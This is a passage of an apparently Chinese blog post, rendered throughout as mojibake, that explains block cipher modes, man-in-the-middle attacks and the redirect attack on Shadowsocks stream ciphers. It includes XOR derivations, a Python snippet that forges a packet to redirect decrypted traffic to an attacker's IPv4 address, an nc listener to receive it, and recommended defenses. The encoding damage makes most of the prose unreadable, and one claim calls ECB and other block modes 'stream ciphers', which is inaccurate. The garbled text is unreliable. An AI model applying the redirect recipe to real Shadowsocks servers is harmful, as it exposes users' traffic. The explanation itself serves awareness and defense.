å°±æ˜¯ä¸€ä¸ªåŸºäºæ•°æ®å—çš„åŠ å¯†ç®—æ³•ã€‚å¯¹äºè¿™ä¸€ç¼ºé™·ï¼Œå¯ä»¥ç”¨è¿™æ ·ä¸€ç§æ€è·¯ï¼šå…ˆå°†æ˜æ–‡åˆ‡å‰²æˆè‹¥å¹²ä¸ªæ•°æ®å—ï¼Œå¯¹äºæ¯ä¸ªå—ç”¨ AES åšåŠ å¯†ï¼Œå†æŠŠæ¯ä¸ªåŠ å¯†åçš„å—æ‹¼èµ·æ¥ã€‚</p><p>æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿå…¶å®è¿™å°±æ˜¯ ECB æ¨¡å¼ã€‚ä½¿ç”¨è¿™ä¸ªæ€è·¯çš„ <code>AES-256</code> ç®—æ³•è¢«ç§°ä¸º <code>AES-256-ECB</code>ã€‚ç”±äº 16 å­—èŠ‚å¯¹äºä¸€äº›æ•°æ®æ¥è¯´å®åœ¨æ˜¯å¤ªå°ï¼Œå¾ˆå®¹æ˜“å‡ºç°å¤§é‡é‡å¤çš„å—ã€‚ä¾‹å¦‚æœ‰è¿™æ ·ä¸€å¼ å›¾ç‰‡ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg" alt="Original image" title="Original image"></p><p>å¤§å®¶éƒ½çŸ¥é“è¿™æ˜¯ä¸€åªå°ä¼é¹…ï¼Œæˆ‘ä»¬ç”¨ ECB åŠ å¯†ä¸€ä¸‹å†çœ‹çœ‹ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Tux_ecb.jpg" alt="Encrypted using ECB mode" title="Encrypted using ECB mode"></p><p>åº”è¯¥ä¾æ—§èƒ½çœ‹å‡ºæ¥å›¾ä¸­æ˜¯åˆšæ‰é‚£åªå°ä¼é¹…ã€‚ECB æ¨¡å¼æ— æ³•éšè—åŸæ–‡çš„ç‰¹å¾ï¼Œè¯·å¤§å®¶å°½é‡ä¸è¦ä½¿ç”¨ã€‚</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" alt="Electronic Codebook (ECB) mode encryption" title="Electronic Codebook (ECB) mode encryption"></p><p>æœ‰ä¸€äº›æ”¹è‰¯çš„æ–¹æ³•ï¼Œä¾‹å¦‚é™¤äº†å¯†ç ä»¥å¤–ï¼Œå†æä¾›ä¸€ä¸ªåˆå§‹å‘é‡ <code>IV</code> ä½œä¸ºç¬¬ 0 ä¸ªæ•°æ®å—ï¼Œåœ¨åŠ å¯†ç¬¬ i ä¸ªå—ä¹‹å‰ï¼Œå…ˆå°†æ˜æ–‡è·Ÿä¸Šä¸€ä¸ªå—çš„åŠ å¯†ç»“æœå¼‚æˆ–ä¸€ä¸‹ï¼Œå³ï¼š</p><pre><code class="lang-text">Cipher[0] = IV
Cipher[i] = Encrypt(Plain[i] ^ Cipher[i - 1])</code></pre><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/CBC_encryption.svg/601px-CBC_encryption.svg.png" alt="Cipher Block Chaining (CBC) mode encryption" title="Cipher Block Chaining (CBC) mode encryption"></p><p>è¿™ç§æ–¹å¼ä¼šæ¯”åˆšæ‰çš„ ECB å®‰å…¨å¾—å¤šã€‚</p><p>è¿˜æœ‰å…¶å®ƒçš„ä¸€äº›æ–¹å¼ï¼Œæ‰€æœ‰çš„è¿™äº›æ–¹å¼ï¼ˆåŒ…æ‹¬ ECBï¼‰ç»Ÿç§°ä¸ºâ€œæµå¯†ç â€ã€‚ä¸€å¼€å§‹çš„é‚£å¼ å°ä¼é¹…ï¼Œç”¨ ECB ä»¥å¤–çš„æ–¹å¼åŠ å¯†ä¹‹åæ˜¯è¿™æ ·çš„ï¼Œå·²ç»å®Œå…¨çœ‹ä¸å‡ºæ˜¯ä»€ä¹ˆäº†ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/a/a0/Tux_secure.jpg" alt="Modes other than ECB result in pseudo-randomness" title="Modes other than ECB result in pseudo-randomness"></p><h2>ä¸­é—´äººæ”»å‡»</h2><p>ä¸­é—´äººæ”»å‡»æ˜¯ä¸ªæ¯”è¾ƒå¥½ç©çš„ä¸œè¥¿ï¼Œå‡è®¾æ”»å‡»è€…åˆ©ç”¨ä¸€äº›æ–¹æ³•ï¼ˆæ¯”å¦‚ç”¨ä¸€ä¸ªé’“é±¼çƒ­ç‚¹ï¼‰è®©å—å®³è€…å‘å‡ºçš„æ•°æ®åŒ…èµ°åˆ°äº†è‡ªå·±è¿™é‡Œï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æŸ¥çœ‹æˆ–è€…ä¿®æ”¹æ•°æ®åŒ…çš„å†…å®¹ã€‚å°±å¥½åƒå°æ˜åœ¨è¯¾ä¸Šç»™å°çº¢ä¼ çº¸æ¡ï¼Œæœ¬æ¥å†™çš„æ˜¯â€œæˆ‘å–œæ¬¢ä½ â€ï¼Œä½†åœ¨ç»è¿‡å°äº®çš„æ—¶å€™ï¼Œå°äº®ç”¨è‡ªå·±çš„çº¸æ¡æ›¿æ¢äº†ä»–ä»¬çš„ï¼Œä¸Šé¢å†™ç€â€œæ»šçŠŠå­å§â€ï¼Œå¯è§ä¸­é—´äººæ”»å‡»å¯¹æˆ‘ä»¬çš„å½±å“æœ‰å¤šå¤§ã€‚</p><blockquote><p>æ³¨ï¼šåœ¨è¯¾ä¸Šä¼ çº¸æ¡æ˜¯ä¸å¥½çš„è¡Œä¸ºï¼Œå°æœ‹å‹ä»¬ä¸è¦æ¨¡ä»¿ã€‚</p></blockquote><p>å¤§å®¶åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­æœ€å¸¸ç»å†çš„ä¸­é—´äººæ”»å‡»ï¼Œå¯èƒ½æ˜¯åœ¨è®¿é—®æŸäº› HTTP ç½‘ç«™çš„æ—¶å€™ï¼Œçªç„¶å¼¹å‡ºä¸€ä¸ªâ€œå®½å¸¦åˆ°æœŸéœ€è¦ç»­è´¹â€çš„é€šçŸ¥ã€‚è¿™ç§ä¸­é—´äººæ”»å‡»æ˜¯ä¸€äº›æ— è‰¯è¿è¥å•†å¹²çš„ï¼Œä¸è¿‡æˆ‘ä»¬æ›´ä¹ æƒ¯æŠŠå®ƒå«åšâ€œæµé‡åŠ«æŒâ€ã€‚</p><h2>æ•°æ®å®Œæ•´æ€§</h2><p>è¿™ä¸€æ®µå°±å·ä¸ªæ‡’ï¼Œç›´æ¥æ‘˜æŠ„ç™¾åº¦ç™¾ç§‘äº†ï¼ˆæœ‰åˆ æ”¹ï¼‰ï¼š</p><blockquote><p>å®Œæ•´æ€§æ˜¯ä¿¡æ¯å®‰å…¨çš„ä¸‰ä¸ªåŸºæœ¬è¦ç‚¹ä¹‹ä¸€ï¼ŒæŒ‡ç”¨æˆ·ã€è¿›ç¨‹æˆ–è€…ç¡¬ä»¶ç»„ä»¶å…·æœ‰èƒ½åŠ›ï¼Œèƒ½å¤ŸéªŒè¯æ‰€å‘é€æˆ–ä¼ é€çš„ä¸œè¥¿çš„å‡†ç¡®æ€§ï¼Œå¹¶ä¸”è¿›ç¨‹æˆ–ç¡¬ä»¶ç»„ä»¶ä¸ä¼šè¢«ä»¥ä»»ä½•æ–¹å¼æ”¹å˜ã€‚</p></blockquote><p>ç¿»è¯‘æˆç™½è¯å°±æ˜¯ï¼šèƒ½ä¿è¯æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸è¢«ç¯¡æ”¹ï¼Œå°çº¢æ”¶åˆ°çš„çº¸æ¡å†…å®¹è·Ÿå°æ˜ä¼ å‡ºå»çš„ä¸€æ¨¡ä¸€æ ·ã€‚</p><ul><li>å¤§å®¶å¬è¯´è¿‡çš„ ECC å†…å­˜çº é”™ç®—æ³•å°±èƒ½ä¿è¯æ•°æ®å®Œæ•´æ€§ï¼Œå®ƒå¯ä»¥å‘ç°å†…å­˜æ•°æ®è¢«ç¯¡æ”¹ï¼ˆä¾‹å¦‚é­å—äº†é«˜èƒ½ç²’å­å†²å‡»æˆ–ç¡¬ä»¶çš„éƒ¨åˆ†æŸåï¼‰ï¼Œå¹¶é€šè¿‡ä¸€äº›ç®—æ³•å°½é‡æ¢å¤è¢«æŸåçš„éƒ¨åˆ†ï¼›</li><li>HTTPS ä¸­çš„æ•°å­—ç­¾åä¹Ÿæ˜¯ä¸€ç§ä¿è¯æ•°æ®å®Œæ•´æ€§çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥å‘ç°ä¼ è¾“çš„æ•°æ®è¢«ç¯¡æ”¹ï¼ˆä¾‹å¦‚ä¸­é—´äººæ”»å‡»ï¼‰ï¼Œå¹¶ä¸”ç«‹å³åœæ­¢æ•°æ®ä¼ è¾“ï¼Œä»¥é˜²æ­¢ç”¨æˆ·æˆ–æœåŠ¡å™¨å› ä¸ºæ¥æ”¶åˆ°è™šå‡æ•°æ®è€Œé­å—æŸå¤±ã€‚</li></ul><h2>Shadowsocks åè®®åŸºç¡€</h2><p>è™½ç„¶ Shadowsocks ä½¿ç”¨çš„åº•å±‚åè®®æ˜¯ SOCKS5ï¼Œä½†å¯¹äºæœ¬æ–‡è€Œè¨€ï¼Œåº•å±‚çš„ SOCKS5 å¹¶ä¸æ˜¯é‡ç‚¹ï¼Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨ Shadowsocks çš„å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´æ˜¯å¦‚ä½•ä¼ è¾“æ•°æ®çš„ã€‚</p><p>æ ¹æ®å®˜æ–¹æ–‡æ¡£æ‰€è¯´ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€çš„æ•°æ®ï¼Œä¸€å¼€å§‹æ˜¯æµå¯†ç çš„ <code>IV</code>ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>IV</code> ç”±å®¢æˆ·ç«¯ç”Ÿæˆï¼Œå¹¶ç›´æ¥æ‰”è¿›æ•°æ®åŒ…ä¸­ï¼‰ï¼Œä¹‹åå°±æ˜¯ä¸€æ®µåŠ å¯†æ•°æ®ï¼Œå®ƒçš„æ˜æ–‡æ ¼å¼æ˜¯è¿™æ ·çš„ï¼š</p><pre><code class="lang-text">[ç›®æ ‡åœ°å€][æ•°æ®]</code></pre><p>å…¶ä¸­æ•°æ®å¯ä»¥æ˜¯ä»»æ„é•¿åº¦ï¼›è‡³äºç›®æ ‡åœ°å€ï¼ŒShadowsocks ç”¨çš„æ˜¯ SOCKS5 çš„è¡¨ç¤ºæ³•ï¼š</p><pre><code class="lang-text">[1 å­—èŠ‚ç±»å‹][ä¸»æœºå][2 å­—èŠ‚ç«¯å£]</code></pre><p>å…¶ä¸­ï¼Œç±»å‹æ˜¯ 1 å­—èŠ‚çš„æšä¸¾å€¼ï¼š</p><ul><li>0x01ï¼šä¸»æœºåæ˜¯ IPv4 åœ°å€ï¼›</li><li>0x03ï¼šä¸»æœºåæ˜¯å˜é•¿å­—ç¬¦ä¸²ï¼Œé¦–å­—èŠ‚è¡¨ç¤ºé•¿åº¦ï¼ˆæœ€å¤§ 255ï¼‰ï¼Œåé¢æ˜¯æ•°æ®ï¼›</li><li>0x04ï¼šä¸»æœºåæ˜¯ IPv6 åœ°å€ã€‚</li></ul><p>ä¸€æ¬¡ä»£ç†çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å®¢æˆ·ç«¯å°†è¿™äº›æ•°æ®åŠ å¯†åå‘åˆ°æœåŠ¡å™¨ï¼›</li><li>æœåŠ¡å™¨æ”¶åˆ°åå°†å…¶è§£å¯†ï¼Œä¼šå¾—åˆ° <code>[1 å­—èŠ‚ç±»å‹][ä¸»æœºå][2 å­—èŠ‚ç«¯å£][æ•°æ®]</code>ï¼›</li><li>æœåŠ¡å™¨ä¼šå°†æ•°æ®éƒ¨åˆ†ç›´æ¥å‘é€ç»™ <code>ä¸»æœºå:ç«¯å£</code>ï¼›</li><li>æœåŠ¡å™¨å°†ä¸»æœºè¿”å›çš„æ•°æ®ç›´æ¥ä½¿ç”¨åŒæ ·çš„ç®—æ³•åŠ å¯†ï¼ˆå¦‚æœåŠ å¯†ç®—æ³•ç”¨äº†æµå¯†ç ï¼Œåˆ™ä¼šç”Ÿæˆå¹¶ä½¿ç”¨ä¸€ä¸ªæ–°çš„ <code>IV</code>ï¼Œå¹¶å°†å…¶æ”¾åœ¨åŒ…çš„æœ€å‰é¢ï¼‰ï¼Œå‘é€ç»™å®¢æˆ·ç«¯ï¼›</li><li>å®¢æˆ·ç«¯è§£å¯†åå³å¯å¾—åˆ°ä¸»æœºè¿”å›çš„æ•°æ®ã€‚</li></ol><h1>Shadowsocks + æµå¯†ç çš„ä¸å®‰å…¨å› ç´ </h1><p>å›åˆ°ä¸€å¼€å§‹è¯´çš„é‚£ç¯‡æ–‡ç« ä¸Šï¼Œä½œè€…çš„å‘ç°æ˜¯ï¼šå¦‚æœæ”»å‡»è€…æŠ“åˆ°äº†ä¸€ä¸ª Shadowsocks æœåŠ¡å™¨è¿”å›çš„åŒ…ï¼Œå¹¶ä¸”å·²çŸ¥æ•°æ®éƒ¨åˆ†çš„å¼€å¤´ä¸ƒä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨é‚£ä¸ª Shadowsocks æœåŠ¡å™¨æ¥è§£å‡ºåŒ…çš„ç»å¤§éƒ¨åˆ†å†…å®¹ï¼ˆæœ€å¤šæŸå¤± 16 å­—èŠ‚ï¼‰ã€‚</p><p>ä½œè€…çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼š</p><p>å‡è®¾æœ‰ä¸€å° Shadowsocks æœåŠ¡å™¨ï¼Œæ”»å‡»è€…é€šè¿‡å—…æ¢æˆ–å…¶å®ƒæ–¹å¼æŠ“åˆ°äº†è¿™ä¸ª Shadowsocks æœåŠ¡å™¨è¿”å›çš„ä¸€ä¸ªåŒ…ã€‚</p><p>ä¸ºäº†çŸ¥é“æ˜æ–‡å†…å®¹ï¼Œæ”»å‡»è€…è¦ä¹ˆæš´åŠ›ç ´è§£å¯†ç ï¼ˆéšç€å¤§å®¶å®‰å…¨æ„è¯†çš„æå‡ï¼Œè¿™å·²ç»å‡ ä¹ä¸å¯è¡Œäº†ï¼‰ï¼Œè¦ä¹ˆæƒ³åŠæ³•åˆ©ç”¨è¿™å° Shadowsocks æœåŠ¡å™¨å¸®å¿™è§£å¯†ã€‚</p><p>ä½œè€…é€‰æ‹©äº†åè€…ï¼Œå³æƒ³åŠæ³•æŠŠè¿™ä¸ªåŒ…å˜æˆå®¢æˆ·ç«¯å‘çš„åŒ…ï¼Œè®©æœåŠ¡å™¨è§£å¯†åä»£ç†åˆ°è‡ªå·±æŒ‡å®šçš„æœåŠ¡å™¨ï¼Œè¿™è¢«ç§°ä¸º <code>Redirect attack</code>ã€‚</p><p>ä¸Šä¸€èŠ‚è¯´åˆ°ï¼ŒShadowsocks å®¢æˆ·ç«¯å‘çš„åŒ…æ ¼å¼ï¼ˆæ˜æ–‡çŠ¶æ€ä¸‹ï¼‰æ˜¯ <code>[1 å­—èŠ‚ç±»å‹][ä¸»æœºå][2 å­—èŠ‚ç«¯å£][æ•°æ®]</code>ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥åˆ©ç”¨åŠ å¯†ç®—æ³•çš„ç¼ºé™·æ¥ç¯¡æ”¹æ˜æ–‡æ•°æ®ï¼Œå°±å¯ä»¥æŠŠä¸»æœºåæ”¹æˆæ”»å‡»è€…çš„æœåŠ¡å™¨åœ°å€ï¼ŒShadowsocks æœåŠ¡å™¨å°±ä¼šä»¥ä¸ºå®¢æˆ·ç«¯æƒ³è®¿é—®æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œäºæ˜¯å°±æŠŠè§£å¯†åçš„åŒ…ä¸­çš„æ•°æ®éƒ¨åˆ†å‘äº†è¿‡å»ã€‚</p><p>å…ˆè€ƒè™‘å¦‚ä½•ç¯¡æ”¹æ•°æ®ã€‚å‡è®¾è¿™å° Shadowsocks æœåŠ¡å™¨çš„åŠ å¯†ç®—æ³•ä½¿ç”¨çš„æ˜¯ <code>AES-256-CFB</code>ï¼Œé‚£ä¹ˆè§£å¯†çš„æ–¹å¼å¦‚ç»´åŸºç™¾ç§‘æ‰€è¿°æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/CFB_decryption.svg/601px-CFB_decryption.svg.png" alt="Cipher Feedback (CFB) mode decryption" title="Cipher Feedback (CFB) mode decryption"></p><p>å…¶ä¸­ <code>IV</code>ã€æ¯ä¸€å— Ciphertext å’Œ Plaintext é•¿åº¦éƒ½æ˜¯ 16 å­—èŠ‚ã€‚</p><p>ä½œè€…å‘ç°ï¼Œ<code>key</code> æ˜¯ä¸å˜çš„ï¼Œ<code>IV</code> ä¹Ÿå¯ä»¥é‡ç”¨æœåŠ¡å™¨è¿”å›åŒ…ä¸­çš„é‚£ä¸ªï¼Œé‚£ä¹ˆå¦‚æœåªä¿®æ”¹ç¬¬ä¸€å— Ciphertextï¼Œé‚£ä¹ˆ<strong>åªæœ‰å‰ä¸¤å— Plaintext ä¼šæ”¹å˜</strong>ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œç”±äºç¬¬ä¸€å— Plaintext å°±æ˜¯ç¬¬ä¸€å— Ciphertext è·ŸæŸä¸ªä¸² A çš„å¼‚æˆ–å€¼ï¼Œé‚£ä¹ˆæ”»å‡»è€…å®Œå…¨å¯ä»¥<strong>é€šè¿‡ä¿®æ”¹ç¬¬ä¸€å— Ciphertext çš„å€¼æ¥æ§åˆ¶ç¬¬ä¸€å— Plaintext</strong>ï¼å…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>å‡è®¾å½“å‰çš„ç¬¬ä¸€å— Ciphertext æ˜¯ <code>c1</code>ï¼Œç¬¬ä¸€å— Plaintext æ˜¯ <code>p1</code>ï¼Œ<code>IV</code> åšäº†ä¸€ç³»åˆ— whatever çš„è¿ç®—å¾—åˆ°çš„ç»“æœæ˜¯ <code>a</code>ï¼Œé‚£ä¹ˆï¼š</p><pre><code class="lang-text">å·²çŸ¥ a ^ c1 == p1
é‚£ä¹ˆ a ^ c1 ^ X == p1 ^ X
æ ¹æ®å¼‚æˆ–çš„ç»“åˆå¾‹
å¯å¾— a ^ (c1 ^ X) == (p1 ^ X)
ä¹Ÿå°±æ˜¯è¯´ï¼Œæ”»å‡»è€…å¯¹ c1 åšçš„å¼‚æˆ–æ“ä½œï¼Œä¼šå®Œå®Œå…¨å…¨åæ˜ åœ¨ p1 ä¸Š

å‡è®¾æœ€ç»ˆè®© p1 å˜æˆäº† q1ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸º
å·²æœ‰ p1 ^ X == q1ï¼Œå°†ä¸¤è¾¹åŒæ—¶å¼‚æˆ– p1
å¯å¾— p1 ^ X ^ p1 == q1 ^ p1
ç”±äºå¼‚æˆ–çš„æ€§è´¨ï¼Œå·¦è¾¹çš„ä¸¤ä¸ª p1 æŠµæ¶ˆ
å¯å¾— X == q1 ^ p1</code></pre><p>æ”»å‡»è€…éœ€è¦åšçš„å°±æ˜¯å°† <code>c1 ^= (q1 ^ p1)</code>ã€‚ä½†è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½çŸ¥é“å…·ä½“çš„ <code>p1</code> æ˜¯ä»€ä¹ˆï¼ä¸è¿‡è¿˜å¥½ï¼Œå®ƒæ˜¯æ˜æ–‡æ•°æ®çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨ä¸Šç½‘çš„è¿‡ç¨‹ä¸­ï¼Œæ€»æœ‰äº›åè®®çš„å¤´å‡ ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„ï¼Œä¾‹å¦‚ HTTP åè®®ã€‚</p><p>åœ¨ 21 ä¸–çºªçš„ç¬¬ä¸‰ä¸ªåå¹´ï¼Œå¤§å®¶åº”è¯¥æ—©å°±åˆ‡æ¢æˆ HTTP 1.1 äº†ï¼Œå› æ­¤è¿”å›çš„æ•°æ®åŒ…ä¸€å¼€å§‹ä¸€å®šæ˜¯ 8 ä¸ªå­—èŠ‚ <code>HTTP/1.1</code>ã€‚æ”»å‡»è€…èƒ½å¦å°† TA çš„ä¸»æœºåœ°å€å‹ç¼©åˆ°è¿™ä¹ˆå°å‘¢ï¼Ÿæ¯•ç«Ÿé™¤æ‰ 1 å­—èŠ‚ç±»å‹å’Œ 2 å­—èŠ‚ç«¯å£ä»¥å¤–ï¼Œå¯ç”¨ç©ºé—´åªæœ‰ 5 å­—èŠ‚äº†ã€‚</p><p>å¯¹äºç»å¤§éƒ¨åˆ†æ”»å‡»è€…æ¥è¯´ï¼Œä¸å¯èƒ½æ‹¿åˆ°ä¸è¶…è¿‡ 5 å­—èŠ‚çš„åŸŸåï¼Œå› æ­¤åªèƒ½è€ƒè™‘ IPv4 äº†ï¼Œè€Œä¸”å¦‚æœç”¨ IPv4 çš„è¯ï¼Œç”šè‡³åªéœ€è¦æ€»å…± 7 ä¸ªå­—èŠ‚ï¼ä¸¾ä¸ªä¾‹å­ï¼š</p><pre><code class="lang-text">01 c0 a8 01 03 12 12
-- ----------- -----</code></pre><p>åˆ’çº¿çš„ä¸‰éƒ¨åˆ†åˆ†åˆ«ä»£è¡¨äº†ï¼šä½¿ç”¨ IPv4 åè®®ã€åœ°å€æ˜¯ 192.168.1.3ï¼Œç«¯å£æ˜¯ 4626ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥ä»¤ï¼š</p><pre><code class="lang-python">p1 = 'HTTP/1.'
q1 = '\x01\xc0\xa8\x01\x03\x12\x12'
new_c_part = c1[0:7] ^ p1 ^ q1</code></pre><p>ç”¨è¿™ä¸ª 7 å­—èŠ‚çš„ <code>new_c_part</code> æ›¿æ¢æ‰ä¹‹å‰ <code>c1</code> çš„å‰ 7 ä¸ªå­—èŠ‚ï¼Œç„¶åç›´æ¥å°†æ›¿æ¢åçš„æ•´ä¸ªåŒ…å‘é€åˆ°åˆšæ‰çš„ Shadowsocks æœåŠ¡å™¨ã€‚</p><p>Shadowsocks æœåŠ¡å™¨å°è¯•è§£å¯†ï¼Œè§£å¯†åå‘ç°æ˜æ–‡æ˜¯è¿™æ ·çš„ï¼š</p><pre><code class="lang-text">01 c0 a8 01 03 12 12 XX XX XX XX XX XX XX XX XX</code></pre><p>æœåŠ¡å™¨ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå› æ­¤å°†åé¢çš„ä¸€ä¸² <code>XX</code>ï¼ˆæ˜æ–‡æ•°æ®ï¼‰æŒ‰ç…§å‰ 7 ä¸ªå­—èŠ‚çš„è¦æ±‚ï¼Œè½¬å‘åˆ°äº† <code>192.168.1.3:4626</code>ã€‚</p><p>æ”»å‡»è€…æ—©å°±åœ¨è¿™å„¿åç­‰äº†ï¼Œæ–¹æ³•éå¸¸ç®€å•ï¼Œåªéœ€è¦ç”¨ <code>nc</code> å¯åŠ¨ä¸€ä¸ªç«¯å£ç›‘å¬å³å¯ï¼š</p><pre><code class="lang-text">$ nc -l -p 4626</code></pre><p>ç”±äºæ”»å‡»è€…ä¿®æ”¹äº† <code>c1</code>ï¼Œè€Œ <code>c1</code> åœ¨ CFB æ¨¡å¼ä¸­åˆç”¨æ¥è§£å¯† <code>p2</code>ï¼Œå› æ­¤æ”¶åˆ°çš„ <code>p2</code> è¿™ 16 ä¸ªå­—èŠ‚åº”è¯¥æ˜¯ä¹±ç ã€‚æ”»å‡»è€…æœ€ç»ˆå¯ä»¥è¿˜åŸå‡º <code>p2</code> ä»¥å¤–çš„æ‰€æœ‰æ•°æ®ã€‚è®ºæ–‡ä¸­çš„å‘½ä»¤è¡Œæˆªå›¾ä¹Ÿè¯´æ˜äº†è¿™ç‚¹ï¼Œè·å–åˆ°çš„æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ä¹‹å‰åŒ…çš„æ˜æ–‡çš„ç¬¬ 8 ä¸ªå­—èŠ‚ï¼ˆå‰ 7 ä¸ªæ˜¯ <code>HTTP/1.</code>ï¼‰ï¼Œç„¶åæœ‰ 9 ä¸ªå­—èŠ‚æ˜¯æ­£ç¡®çš„ï¼Œä¹‹å 16 ä¸ªå­—èŠ‚æ˜¯ä¹±ç ï¼Œå†ä¹‹åæ˜¯å®Œå…¨æ­£ç¡®çš„ï¼š</p><pre><code class="lang-text">1 304 Not???????????????? Sat, 26 Jan 2019 07:15:21 GMT
Connection: close
Via: 1.1 varnish
Cache-Control: max-age=600
ETag: W/&quot;5c45d22a-127&quot;
Expires: Sat, 26 Jan 2019 06:59:41 GMT
Age: 0
....</code></pre><p>ä½œè€…ç»™å‡ºçš„é˜²å¾¡æªæ–½æ˜¯ï¼š</p><ul><li>ç¦ç”¨ shadowsocks-pyã€shadowsocks-goã€go-shadowsocks2ã€shadowsocks-nodejs</li><li>åªç”¨ shadowsocks-libevï¼Œå¹¶ä¸”åªä½¿ç”¨ AEAD åŠ å¯†</li></ul><p>åŸå› å¦‚ä¸‹ï¼šshadowsocks-libev çš„å®ç°å¾ˆä¹…ä¹‹å‰å°±å·²ç»ç¦æ­¢äº† <code>IV</code> é‡ç”¨ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢è¿™ç§æ”»å‡»ï¼›åªè¦åŠ å¯†ç®—æ³•å¸¦æœ‰ AEAD ç‰¹æ€§ï¼Œé‚£ä¹ˆæ•°æ®å°±æ— æ³•è¢«ç¯¡æ”¹ï¼Œæœ¬æ–‡çš„æ”»å‡»æ–¹å¼ä¹Ÿæ˜¯æ— æ•ˆçš„ã€‚</p><h1>å¯¹å¤§ä¼—çš„å½±å“</h1><p>è™½ç„¶æ–‡ç« ä¸­åªåˆ—ä¸¾äº† HTTP åè®®å’Œ CFB æ¨¡å¼çš„ä¾‹å­ï¼Œä½†ç†è®ºä¸Šæ¥è¯´ï¼Œæ‰€æœ‰å¤´éƒ¨ 7 ä¸ªå­—èŠ‚å·²çŸ¥çš„åè®®å’Œæ‰€æœ‰ç±»ä¼¼æµå¯†ç çš„ç»„åˆï¼Œéƒ½å¯ä»¥è¢«è¿™ç§æ–¹æ³•æ”»å‡»ã€‚ä½ ä¸èƒ½ä¿è¯ä½ ç§‘å­¦ä¸Šçš„ç½‘æ€»æ˜¯ HTTPSï¼Œå³ä½¿æ˜¯ HTTPSï¼Œå¦‚æœæ˜¯å›½å†…ç½‘ç«™ï¼Œå½“æŸäº›ä¸å¯æŠ—åŠ›è·å–äº†å…¶è¯ä¹¦ä¹‹åï¼Œä½ çš„ TLS æµé‡æ€»æ˜¯ä¼šè¢«è§£å¯†çš„ã€‚</p><p>ä¸è¿‡æœ‰ä¸€äº›å€¼å¾—æ¬£æ…°çš„åœ°æ–¹ï¼š</p><p>ç”±äºå¢™çš„é€æ¸å‡é«˜ï¼Œå¤§å®¶å·²ç»é€æ¸æ„è¯†åˆ°â€œåªæœ‰åŠ å¯†æ˜¯ä¸è¡Œçš„â€äº†ï¼Œå› æ­¤çº·çº·æ”¹ç”¨å¸¦æœ‰æ··æ·†åŠŸèƒ½çš„ç§‘å­¦ä¸Šç½‘å·¥å…·ã€‚ç”±äºæ”»å‡»è€…æ— æ³•å¾—çŸ¥æ··æ·†çš„å‚æ•°ï¼ˆç”šè‡³ä¸çŸ¥é“å“ªä¸ªæµé‡æ˜¯æ¢¯å­çš„æµé‡ï¼‰ï¼Œå› æ­¤è¿™ä¸ªæ–¹æ³•ä¸å†èµ·ä½œç”¨äº†ã€‚</p><p>ç›®å‰å¤§éƒ¨åˆ†ç§‘å­¦ä¸Šç½‘å·¥å…·å·²ç»ç¦ç”¨äº†æ—§çš„åŠ å¯†ç®—æ³•ï¼Œç”šè‡³å¼ºåˆ¶åªè®©ä½¿ç”¨å¸¦æœ‰ GCM æˆ–è€… Poly1305 çš„åŠ å¯†ç®—æ³•ï¼Œè¿™äº›ç®—æ³•æœ‰ä¸¥æ ¼çš„ AEAD ç‰¹æ€§ï¼Œå¯ä»¥æå¤§ä¿è¯æ•°æ®å®‰å…¨ã€‚TLS 1.3 å¼ºåˆ¶ä½¿ç”¨ AEAD ä¹Ÿåœ¨æŸäº›ç¨‹åº¦ä¸Šä¸ºå®ƒçš„å®‰å…¨æ€§åšäº†æ‹…ä¿ã€‚</p><p>å¦‚æœä½ è¿˜åœ¨ç”¨ Shadowsocks æˆ–å…¶è¡ç”Ÿå·¥å…·ï¼Œå¹¶ä¸”ä¾æ—§ä½¿ç”¨æ™®é€šçš„æµå¯†ç æ¥åŠ å¯†ï¼Œé‚£ä¹ˆè¯·ç«‹å³å¬ä»ä½œè€…ç»™å‡ºçš„é˜²å¾¡æªæ–½ï¼Œä¸ºäº†ä½ çš„æœåŠ¡å™¨ï¼Œä¹Ÿä¸ºäº†ä½ è‡ªå·±ã€‚</p><h1>å‚è€ƒèµ„æ–™</h1><ul><li><a href="https://github.com/edwardz246003/shadowsocks">edwardz246003/shadowsocks: Redirect attack on Shadowsocks stream ciphers</a></li><li><a href="https://shadowsocks.org/en/spec/Protocol.html">Shadowsocks - Protocol</a></li><li><a href="https://shadowsocks.org/en/spec/Stream-Ciphers.html">Shadowsocks - Stream Ciphers</a></li><li><a 